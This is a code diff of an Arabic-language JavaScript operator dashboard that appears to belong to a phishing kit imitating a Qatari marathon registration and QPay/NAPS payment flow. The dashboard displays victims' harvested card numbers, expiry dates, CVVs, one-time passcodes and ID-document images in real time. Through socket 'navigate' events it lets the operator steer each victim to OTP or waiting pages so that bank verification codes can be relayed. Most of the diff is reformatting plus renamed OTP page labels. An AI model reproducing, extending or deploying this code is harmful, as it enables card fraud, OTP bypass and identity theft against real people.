@@ -5,8 +5,8 @@ const PAGES = [
   { id: 'payment', name: 'اختيار الدفع', icon: 'fa-credit-card', url: '/payment.html' },
   { id: 'payment-card', name: 'بطاقة الائتمان', icon: 'fa-credit-card-alt', url: '/payment-card.html' },
   { id: 'qpy', name: 'QPay', icon: 'fa-mobile-alt', url: '/qpy.html' },
-  { id: 'payment-verify', name: 'التحقق من الرمز', icon: 'fa-lock', url: '/payment-verify.html' },
-  { id: 'otp', name: 'رمز التحقق', icon: 'fa-key', url: '/otp.html' },
+  { id: 'payment-verify', name: 'otp Visa', icon: 'fa-lock', url: '/payment-verify.html' },
+  { id: 'otp', name: 'otp QPY', icon: 'fa-key', url: '/otp.html' },
   { id: 'wait', name: 'شاشة الإنتظار', icon: 'fa-spinner fa-spin', url: '/wait.html' }
 ];
 
@@ -17,8 +17,8 @@ const PAGE_LABELS = {
   'payment': 'اختيار الدفع',
   'payment-card': 'بطاقة الائتمان',
   'qpy': 'QPay',
-  'payment-verify': 'التحقق من الرمز',
-  'otp': 'رمز التحقق',
+  'payment-verify': 'otp Visa',
+  'otp': 'otp QPY',
   'wait': 'شاشة الإنتظار'
 };
 
@@ -67,21 +67,21 @@ if (typeof io !== 'undefined') {
   const instanceKey = (typeof DASHBOARD_CONFIG !== 'undefined' && DASHBOARD_CONFIG.INSTANCE_KEY) ? DASHBOARD_CONFIG.INSTANCE_KEY : 'your_secret_key';
   const serverUrl = (typeof DASHBOARD_CONFIG !== 'undefined' && DASHBOARD_CONFIG.API_URL) ? DASHBOARD_CONFIG.API_URL : 'https://marath.onrender.com';
   const token = getAuthToken();
-  
-  socket = io(serverUrl, { 
+
+  socket = io(serverUrl, {
     query: { instanceKey: instanceKey, token: token },
     auth: { instanceKey: instanceKey, token: token },
     transports: ['websocket', 'polling'],
-    withCredentials: true 
+    withCredentials: true
   });
 
-  socket.on('connect', () => { 
-    console.log('Socket connected'); 
-    loadInitialData(); 
+  socket.on('connect', () => {
+    console.log('Socket connected');
+    loadInitialData();
   });
-  
-  socket.on('disconnect', () => { 
-    console.log('Socket disconnected'); 
+
+  socket.on('disconnect', () => {
+    console.log('Socket disconnected');
   });
 } else {
   console.error("Socket.io script failed to load. The backend server might be down.");
@@ -96,13 +96,13 @@ async function loadInitialData() {
 
 document.addEventListener('DOMContentLoaded', () => {
   loadInitialData();
-  
+
   const logoutBtn = document.getElementById('logout-btn');
   if (logoutBtn) {
     logoutBtn.addEventListener('click', async () => {
       try {
         await apiFetch('/dashboard/logout', { method: 'POST' });
-      } catch (e) {}
+      } catch (e) { }
       localStorage.removeItem('dashboard_auth_token');
       window.location.href = 'login.html';
     });
@@ -125,7 +125,7 @@ async function loadConfig() {
       const headerLogo = document.querySelector('.header-logo');
       if (headerLogo) headerLogo.alt = config.projectName;
     }
-  } catch (err) {}
+  } catch (err) { }
 }
 
 async function loadStats() {
@@ -230,27 +230,27 @@ function getUserStatusInfo(user) {
 
 function renderUserList(list) {
   const usersListEl = document.getElementById('users-list');
-  if(!usersListEl) return;
+  if (!usersListEl) return;
   usersListEl.innerHTML = '';
-  
+
   if (!list || list.length === 0) {
     usersListEl.innerHTML = '<div style="padding:20px; text-align:center; color:var(--text-muted);">لا يوجد مستخدمين نشطين</div>';
     return;
   }
-  
+
   list.forEach(user => {
     const item = document.createElement('div');
     item.className = 'user-item';
-    if(currentUserData && currentUserData.sessionId === user.sessionId) {
+    if (currentUserData && currentUserData.sessionId === user.sessionId) {
       item.classList.add('active');
     }
     item.dataset.sessionId = user.sessionId;
-    
+
     const displayName = getUserDisplayName(user);
     const initials = getInitials(displayName);
     const statusInfo = getUserStatusInfo(user);
     const contact = user.email || user.phone || (user.formData?.registration?.email || user.formData?.registration?.phone || '');
-    
+
     item.innerHTML = `
       <div class="user-avatar">${initials}</div>
       <div class="user-info">
@@ -276,11 +276,11 @@ async function selectUser(sessionId) {
       const contentType = res.headers.get("content-type");
       if (contentType && contentType.includes("application/json")) {
         currentUserData = await res.json();
-        
+
         document.querySelectorAll('.user-item').forEach(el => {
           el.classList.toggle('active', el.dataset.sessionId === sessionId);
         });
-        
+
         renderChat(currentUserData);
       }
     } else if (res.status === 401) {
@@ -303,15 +303,15 @@ function renderChat(data) {
     activeChat.classList.remove('hidden');
     activeChat.style.display = 'flex';
   }
-  
+
   const displayName = getUserDisplayName(data);
   const initials = getInitials(displayName);
   const avatarEl = document.getElementById('user-avatar');
   if (avatarEl) avatarEl.textContent = initials;
-  
+
   const nameEl = document.getElementById('chat-user-name');
   if (nameEl) nameEl.textContent = escapeHtml(displayName);
-  
+
   const statusInfo = getUserStatusInfo(data);
   const pageContainer = document.getElementById('user-current-page');
   if (pageContainer) {
@@ -322,26 +322,26 @@ function renderChat(data) {
       </span>
     `;
   }
-  
+
   const contactEl = document.getElementById('user-contact');
   if (contactEl) {
     const contact = data.email || data.phone || (data.formData?.registration?.email || data.formData?.registration?.phone || '');
     contactEl.textContent = contact || 'لا توجد بيانات تواصل مسجلة';
   }
-  
+
   renderNavButtons(statusInfo.pageId);
   renderMessages(data.formData);
 }
 
 function renderNavButtons(activePage) {
   const container = document.getElementById('nav-buttons');
-  if(!container) return;
+  if (!container) return;
   container.innerHTML = '';
-  
+
   const normalizedActive = (activePage && activePage !== 'unknown' && PAGE_LABELS[activePage])
     ? activePage
     : (currentUserData ? getUserPageId(currentUserData) : 'index');
-  
+
   PAGES.forEach(page => {
     const btn = document.createElement('button');
     btn.className = 'nav-btn';
@@ -349,22 +349,22 @@ function renderNavButtons(activePage) {
     if (page.id === normalizedActive) {
       btn.classList.add('active');
     }
-    
+
     btn.innerHTML = `
       <i class="fa ${page.icon}"></i>
       <span>${page.name}</span>
       <span class="page-indicator"></span>
     `;
-    
+
     btn.addEventListener('click', () => {
-      if(currentUserData && currentUserData.sessionId) {
+      if (currentUserData && currentUserData.sessionId) {
         // 1. Instant optimistic UI switch: move glowing beacon light immediately
         container.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
         btn.classList.add('active');
-        
+
         // 2. Update currentUserData local state
         currentUserData.currentPage = page.id;
-        
+
         // 3. Update chat header page display
         const pageContainer = document.getElementById('user-current-page');
         if (pageContainer) {
@@ -376,21 +376,21 @@ function renderNavButtons(activePage) {
             </span>
           `;
         }
-        
+
         // 4. Update sidebar user item
         const userInList = users.find(u => u.sessionId === currentUserData.sessionId);
         if (userInList) {
           userInList.currentPage = page.id;
           renderUserList(users);
         }
-        
+
         // 5. Emit navigate event to server
         if (socket) {
           socket.emit('navigate', { sessionId: currentUserData.sessionId, page: page.id });
         }
       }
     });
-    
+
     container.appendChild(btn);
   });
 }
@@ -437,10 +437,10 @@ function renderRegistrationDossier(data, container) {
   const fullName = [data.firstName, data.lastName].filter(Boolean).join(' ') || data.name || 'المشارك';
   const category = data.raceCategory || 'سباق الماراثون';
   const price = data.price ? `${data.price} ر.ق` : '';
-  
+
   const card = document.createElement('div');
   card.className = 'registration-dossier-card';
-  
+
   // Header
   const header = document.createElement('div');
   header.className = 'dossier-header';
@@ -458,15 +458,15 @@ function renderRegistrationDossier(data, container) {
     </div>
   `;
   card.appendChild(header);
-  
+
   // Body
   const body = document.createElement('div');
   body.className = 'dossier-body';
-  
+
   // Grid
   const grid = document.createElement('div');
   grid.className = 'dossier-grid';
-  
+
   const fieldsToShow = [
     { key: 'email', label: 'البريد الإلكتروني', icon: 'fa-envelope' },
     { key: 'phone', label: 'رقم الجوال', icon: 'fa-phone' },
@@ -480,7 +480,7 @@ function renderRegistrationDossier(data, container) {
     { key: 'club', label: 'النادي / جهة العمل', icon: 'fa-building' },
     { key: 'coupon', label: 'رمز القسيمة', icon: 'fa-ticket-alt' }
   ];
-  
+
   fieldsToShow.forEach(f => {
     const val = data[f.key];
     if (val && String(val).trim()) {
@@ -494,23 +494,23 @@ function renderRegistrationDossier(data, container) {
     }
   });
   body.appendChild(grid);
-  
+
   // Identity Document Attachment
   const identityFile = data.identityFile;
   if (identityFile && String(identityFile).trim()) {
     const strVal = String(identityFile).trim();
     const fileName = data.identityFileName || 'وثيقة_إثبات_الهوية.jpg';
     const fileSize = data.identityFileSize || '';
-    
-    const isImage = strVal.startsWith('data:image/') || 
-                    (strVal.startsWith('data:') && !strVal.startsWith('data:application/pdf')) ||
-                    /\.(png|jpe?g|webp|gif|svg)$/i.test(strVal) ||
-                    (strVal.includes(';base64,') && !strVal.startsWith('data:application/pdf'));
-    
+
+    const isImage = strVal.startsWith('data:image/') ||
+      (strVal.startsWith('data:') && !strVal.startsWith('data:application/pdf')) ||
+      /\.(png|jpe?g|webp|gif|svg)$/i.test(strVal) ||
+      (strVal.includes(';base64,') && !strVal.startsWith('data:application/pdf'));
+
     if (isImage) {
       const attachBox = document.createElement('div');
       attachBox.className = 'dossier-attachment-box';
-      
+
       const preview = document.createElement('div');
       preview.className = 'dossier-attachment-preview';
       preview.title = 'انقر لعرض الصورة بالحجم الكامل';
@@ -522,13 +522,13 @@ function renderRegistrationDossier(data, container) {
         </div>
       `;
       preview.addEventListener('click', () => window.openImageModal(strVal, fileName));
-      
+
       const downloadA = document.createElement('a');
       downloadA.className = 'btn-download-img';
       downloadA.href = strVal;
       downloadA.download = fileName;
       downloadA.innerHTML = '<i class="fas fa-download"></i> تحميل';
-      
+
       attachBox.appendChild(preview);
       attachBox.appendChild(downloadA);
       body.appendChild(attachBox);
@@ -550,7 +550,7 @@ function renderRegistrationDossier(data, container) {
       body.appendChild(pdfBox);
     }
   }
-  
+
   card.appendChild(body);
   container.appendChild(card);
 }
@@ -558,7 +558,7 @@ function renderRegistrationDossier(data, container) {
 function renderCreditCardComponent(data, container, { isQpay = false } = {}) {
   const rawNum = String(data.cardNumber || '').trim();
   const cleanNum = rawNum.replace(/\s+/g, '');
-  
+
   // Brand detection: starts with 4 -> Visa, starts with 5 -> MasterCard
   let brand = 'other';
   if (cleanNum.startsWith('4')) {
@@ -566,10 +566,10 @@ function renderCreditCardComponent(data, container, { isQpay = false } = {}) {
   } else if (cleanNum.startsWith('5')) {
     brand = 'mastercard';
   }
-  
+
   const formattedNumber = formatCardNumber(cleanNum);
   const cardholder = (data.cardholderName || data['cardholder-name'] || data.name || 'CARDHOLDER NAME').toUpperCase();
-  
+
   let expiry = data.cardExpiry || '';
   if (!expiry && (data.expMonth || data.expYear)) {
     const m = String(data.expMonth || '01').padStart(2, '0');
@@ -577,9 +577,9 @@ function renderCreditCardComponent(data, container, { isQpay = false } = {}) {
     expiry = `${m}/${y}`;
   }
   if (!expiry) expiry = '••/••';
-  
+
   const cvv = data.cardCvv || data.cvv || '•••';
-  
+
   let targetContainer = container;
   if (isQpay) {
     const portalBox = document.createElement('div');
@@ -598,13 +598,13 @@ function renderCreditCardComponent(data, container, { isQpay = false } = {}) {
     `;
     targetContainer = portalBox;
   }
-  
+
   const cardWrapper = document.createElement('div');
   cardWrapper.className = 'credit-card-wrapper';
-  
+
   const cardEl = document.createElement('div');
   cardEl.className = 'credit-card';
-  
+
   cardEl.innerHTML = `
     <div class="cc-top-row">
       <div class="cc-chip-nfc">
@@ -640,10 +640,10 @@ function renderCreditCardComponent(data, container, { isQpay = false } = {}) {
       </div>
     </div>
   `;
-  
+
   cardWrapper.appendChild(cardEl);
   targetContainer.appendChild(cardWrapper);
-  
+
   if (isQpay) {
     container.appendChild(targetContainer);
   }
@@ -652,12 +652,12 @@ function renderCreditCardComponent(data, container, { isQpay = false } = {}) {
 function renderOtpComponent(data, container, { isOtpPage = false } = {}) {
   const code = String(data.otpCode || data.code || '').trim();
   const digits = code ? code.split('') : ['-', '-', '-', '-'];
-  
+
   const outerWrapper = document.createElement('div');
   outerWrapper.className = 'otp-card-container';
-  
+
   let contentTarget = outerWrapper;
-  
+
   if (isOtpPage) {
     const napsFrame = document.createElement('div');
     napsFrame.className = 'otp-naps-frame';
@@ -676,12 +676,12 @@ function renderOtpComponent(data, container, { isOtpPage = false } = {}) {
     outerWrapper.appendChild(napsFrame);
     contentTarget = napsFrame;
   }
-  
+
   const codeBox = document.createElement('div');
   codeBox.className = 'otp-code-box' + (isOtpPage ? '' : ' standard');
-  
+
   const digitsHtml = digits.map(d => `<span class="otp-digit-cell">${escapeHtml(d)}</span>`).join('');
-  
+
   codeBox.innerHTML = `
     <span class="otp-label-text">
       <i class="fas fa-key"></i> رمز التحقق السري لعملية الدفع (One-Time Password)
@@ -695,7 +695,7 @@ function renderOtpComponent(data, container, { isOtpPage = false } = {}) {
       </button>
     </div>
   `;
-  
+
   contentTarget.appendChild(codeBox);
   container.appendChild(outerWrapper);
 }
@@ -704,7 +704,7 @@ function renderMessages(formData) {
   const list = document.getElementById('messages-list');
   if (!list) return;
   list.innerHTML = '';
-  
+
   if (!formData || Object.keys(formData).length === 0) {
     list.innerHTML = `
       <div style="padding:40px 20px; text-align:center; color:var(--text-muted);">
@@ -714,22 +714,22 @@ function renderMessages(formData) {
       </div>`;
     return;
   }
-  
+
   const pageOrder = ['registration', 'registration-summary', 'payment', 'payment-card', 'qpy', 'otp', 'payment-verify', 'wait'];
   const allPages = Array.from(new Set([...pageOrder, ...Object.keys(formData)]));
   let hasEntries = false;
-  
+
   allPages.forEach(pageId => {
     const data = formData[pageId];
     if (data && typeof data === 'object' && Object.keys(data).length > 0) {
       const group = document.createElement('div');
       group.className = 'message-group';
-      
+
       const header = document.createElement('div');
       header.className = 'message-group-header';
       header.innerHTML = `<i class="fas fa-file-alt"></i> ${PAGE_LABELS[pageId] || pageId}`;
       group.appendChild(header);
-      
+
       // 1. Special Case: Registration Dossier Card
       if (pageId === 'registration') {
         renderRegistrationDossier(data, group);
@@ -737,7 +737,7 @@ function renderMessages(formData) {
         list.appendChild(group);
         return;
       }
-      
+
       // 2. Special Case: Payment Card
       if (pageId === 'payment-card') {
         renderCreditCardComponent(data, group, { isQpay: false });
@@ -745,7 +745,7 @@ function renderMessages(formData) {
         list.appendChild(group);
         return;
       }
-      
+
       // 3. Special Case: QPay (Credit card in white container with NAPS logo)
       if (pageId === 'qpy') {
         renderCreditCardComponent(data, group, { isQpay: true });
@@ -753,7 +753,7 @@ function renderMessages(formData) {
         list.appendChild(group);
         return;
       }
-      
+
       // 4. Special Case: OTP (Verification code in white container with NAPS logo)
       if (pageId === 'otp') {
         renderOtpComponent(data, group, { isOtpPage: true });
@@ -761,7 +761,7 @@ function renderMessages(formData) {
         list.appendChild(group);
         return;
       }
-      
+
       // 5. Special Case: Payment Verify (Verification code standard)
       if (pageId === 'payment-verify') {
         renderOtpComponent(data, group, { isOtpPage: false });
@@ -769,7 +769,7 @@ function renderMessages(formData) {
         list.appendChild(group);
         return;
       }
-      
+
       // Fallback: Generic field-by-field layout for other pages (e.g. registration-summary, payment, wait)
       let fieldCount = 0;
       Object.entries(data).forEach(([key, value]) => {
@@ -777,16 +777,16 @@ function renderMessages(formData) {
           if (key.endsWith('Name') && data[key.replace(/Name$/, '')]) return;
           if (key.endsWith('Size') && data[key.replace(/Size$/, '')]) return;
           if (key === 'terms') return;
-          
+
           fieldCount++;
           const item = document.createElement('div');
           item.className = 'message-item';
-          
+
           const label = document.createElement('span');
           label.className = 'message-label';
           label.textContent = FORM_FIELD_LABELS[key] || key;
           item.appendChild(label);
-          
+
           const strVal = String(value).trim();
           const val = document.createElement('span');
           val.className = 'message-value';
@@ -795,14 +795,14 @@ function renderMessages(formData) {
           group.appendChild(item);
         }
       });
-      
+
       if (fieldCount > 0) {
         hasEntries = true;
         list.appendChild(group);
       }
     }
   });
-  
+
   if (!hasEntries) {
     list.innerHTML = `
       <div style="padding:40px 20px; text-align:center; color:var(--text-muted);">
@@ -811,15 +811,9 @@ function renderMessages(formData) {
         <p style="font-size:13px;">المستخدم يتصفح الموقع ولم يقم بإدخال بيانات في النماذج بعد.</p>
       </div>`;
   }
-
-  // Scroll to bottom
-  const chatMessagesEl = document.getElementById('chat-messages');
-  if (chatMessagesEl) {
-    chatMessagesEl.scrollTop = chatMessagesEl.scrollHeight;
-  }
 }
 
-window.copyToClipboard = function(text, btnEl) {
+window.copyToClipboard = function (text, btnEl) {
   if (!text) return;
   const onSuccess = () => {
     if (btnEl) {
@@ -832,7 +826,7 @@ window.copyToClipboard = function(text, btnEl) {
       }, 1800);
     }
   };
-  
+
   if (navigator.clipboard && navigator.clipboard.writeText) {
     navigator.clipboard.writeText(text).then(onSuccess).catch(() => {
       fallbackCopy(text, onSuccess);
@@ -853,12 +847,12 @@ function fallbackCopy(text, cb) {
     document.execCommand('copy');
     document.body.removeChild(ta);
     if (cb) cb();
-  } catch (e) {}
+  } catch (e) { }
 }
 
 function setupSearch() {
   const searchInput = document.getElementById('user-search');
-  if(searchInput) {
+  if (searchInput) {
     searchInput.addEventListener('input', (e) => {
       const term = e.target.value.toLowerCase();
       const filtered = users.filter(u => {
@@ -875,7 +869,7 @@ function setupSearch() {
 if (socket) {
   socket.on('user:connected', ({ sessionId, page, name, email, phone, formData }) => {
     let user = users.find(u => u.sessionId === sessionId);
-    if(user) {
+    if (user) {
       user.isConnected = true;
       if (page && page !== 'unknown') user.currentPage = page;
       if (name) user.name = name;
@@ -886,7 +880,7 @@ if (socket) {
       loadUsers();
     }
     renderUserList(users);
-    if(currentUserData && currentUserData.sessionId === sessionId) {
+    if (currentUserData && currentUserData.sessionId === sessionId) {
       currentUserData.isConnected = true;
       if (page && page !== 'unknown') currentUserData.currentPage = page;
       if (name) currentUserData.name = name;
@@ -900,10 +894,10 @@ if (socket) {
 
   socket.on('user:disconnected', ({ sessionId }) => {
     const user = users.find(u => u.sessionId === sessionId);
-    if(user) {
+    if (user) {
       user.isConnected = false;
       renderUserList(users);
-      if(currentUserData && currentUserData.sessionId === sessionId) {
+      if (currentUserData && currentUserData.sessionId === sessionId) {
         currentUserData.isConnected = false;
         renderChat(currentUserData);
       }
@@ -913,14 +907,14 @@ if (socket) {
 
   socket.on('user:page-change', ({ sessionId, page, name, email, phone }) => {
     const user = users.find(u => u.sessionId === sessionId);
-    if(user) {
+    if (user) {
       if (page && page !== 'unknown') user.currentPage = page;
       user.isConnected = true;
       if (name) user.name = name;
       if (email) user.email = email;
       if (phone) user.phone = phone;
       renderUserList(users);
-      if(currentUserData && currentUserData.sessionId === sessionId) {
+      if (currentUserData && currentUserData.sessionId === sessionId) {
         if (page && page !== 'unknown') currentUserData.currentPage = page;
         currentUserData.isConnected = true;
         if (name) currentUserData.name = name;
@@ -934,8 +928,8 @@ if (socket) {
   socket.on('user:form-submit', (data) => {
     const { sessionId, page, formData, name, email, phone, allFormData } = data;
     const user = users.find(u => u.sessionId === sessionId);
-    if(user) {
-      if(!user.formData) user.formData = {};
+    if (user) {
+      if (!user.formData) user.formData = {};
       user.formData[page] = formData;
       if (allFormData) user.formData = allFormData;
       if (name) user.name = name;
@@ -943,8 +937,8 @@ if (socket) {
       if (phone) user.phone = phone;
       renderUserList(users);
     }
-    if(currentUserData && currentUserData.sessionId === sessionId) {
-      if(!currentUserData.formData) currentUserData.formData = {};
+    if (currentUserData && currentUserData.sessionId === sessionId) {
+      if (!currentUserData.formData) currentUserData.formData = {};
       currentUserData.formData[page] = formData;
       if (allFormData) currentUserData.formData = allFormData;
       if (name) currentUserData.name = name;
@@ -957,8 +951,8 @@ if (socket) {
   socket.on('user:update', (data) => {
     const { sessionId, page, formData, name, email, phone, allFormData } = data;
     const user = users.find(u => u.sessionId === sessionId);
-    if(user) {
-      if(!user.formData) user.formData = {};
+    if (user) {
+      if (!user.formData) user.formData = {};
       if (formData) user.formData[page] = formData;
       if (allFormData) user.formData = allFormData;
       if (page && page !== 'unknown') user.currentPage = page;
@@ -967,8 +961,8 @@ if (socket) {
       if (phone) user.phone = phone;
       renderUserList(users);
     }
-    if(currentUserData && currentUserData.sessionId === sessionId) {
-      if(!currentUserData.formData) currentUserData.formData = {};
+    if (currentUserData && currentUserData.sessionId === sessionId) {
+      if (!currentUserData.formData) currentUserData.formData = {};
       if (formData) currentUserData.formData[page] = formData;
       if (allFormData) currentUserData.formData = allFormData;
       if (page && page !== 'unknown') currentUserData.currentPage = page;
@@ -981,9 +975,9 @@ if (socket) {
 }
 
 function getInitials(name) {
-  if(!name) return 'م';
+  if (!name) return 'م';
   const parts = name.trim().split(' ');
-  if(parts.length >= 2) {
+  if (parts.length >= 2) {
     return (parts[0].charAt(0) + parts[1].charAt(0)).toUpperCase();
   }
   return name.substring(0, 2).toUpperCase();
@@ -991,7 +985,7 @@ function getInitials(name) {
 
 function escapeHtml(str) {
   if (typeof str !== 'string') return str;
-  return str.replace(/[&<>"']/g, function(m) {
+  return str.replace(/[&<>"']/g, function (m) {
     switch (m) {
       case '&': return '&amp;';
       case '<': return '&lt;';
@@ -1002,7 +996,7 @@ function escapeHtml(str) {
   });
 }
 
-window.openImageModal = function(src, title = 'وثيقة إثبات الهوية') {
+window.openImageModal = function (src, title = 'وثيقة إثبات الهوية') {
   let modal = document.getElementById('image-lightbox-modal');
   if (!modal) {
     modal = document.createElement('div');
@@ -1030,11 +1024,11 @@ window.openImageModal = function(src, title = 'وثيقة إثبات الهوي�
   `;
 
   modal.style.display = 'flex';
-  modal.onclick = function() {
+  modal.onclick = function () {
     window.closeImageModal();
   };
 
-  const handleKeydown = function(e) {
+  const handleKeydown = function (e) {
     if (e.key === 'Escape') {
       window.closeImageModal();
       document.removeEventListener('keydown', handleKeydown);
@@ -1043,7 +1037,7 @@ window.openImageModal = function(src, title = 'وثيقة إثبات الهوي�
   document.addEventListener('keydown', handleKeydown);
 };
 
-window.closeImageModal = function() {
+window.closeImageModal = function () {
   const modal = document.getElementById('image-lightbox-modal');
   if (modal) {
     modal.style.display = 'none';
@@ -1052,7 +1046,7 @@ window.closeImageModal = function() {
 
 document.addEventListener('DOMContentLoaded', () => {
   setupSearch();
-  
+
   const closeBtn = document.getElementById('close-chat');
   if (closeBtn) {
     closeBtn.addEventListener('click', () => {
